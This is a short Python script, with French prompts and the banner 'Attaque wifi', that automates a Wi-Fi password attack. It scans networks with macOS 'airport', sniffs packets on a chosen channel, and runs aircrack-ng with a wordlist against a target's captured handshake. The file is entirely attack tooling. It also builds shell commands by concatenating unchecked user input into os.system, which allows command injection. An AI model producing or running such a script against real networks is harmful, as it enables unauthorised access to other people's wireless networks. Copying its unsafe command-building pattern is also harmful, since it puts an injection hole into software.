import os
import time
clear = lambda: os.system('clear')

def sniff():
    channel = input("\nChoose your channel:")
    sniff = "sudo airport en0 sniff "+ channel
    os.system(sniff)
    time.sleep(2.0)


def brutforce():
    wordlist = input("Votre wordlist: ")
    mac = input("L'addresse mac de la cible: ")
    path = input("Le chemin de l'handshake: ")
    crack = "aircrack-ng -w"+ wordlist + " -b "+ mac + " " + path
    os.system(crack)

def aireplay():
    pass

def main():
    print("----------------------------------------Attaque wifi----------------------------------------")
    os.system("sudo airport -s")
    sniff()
    brutforce()

if __name__ == "__main__":
    main()
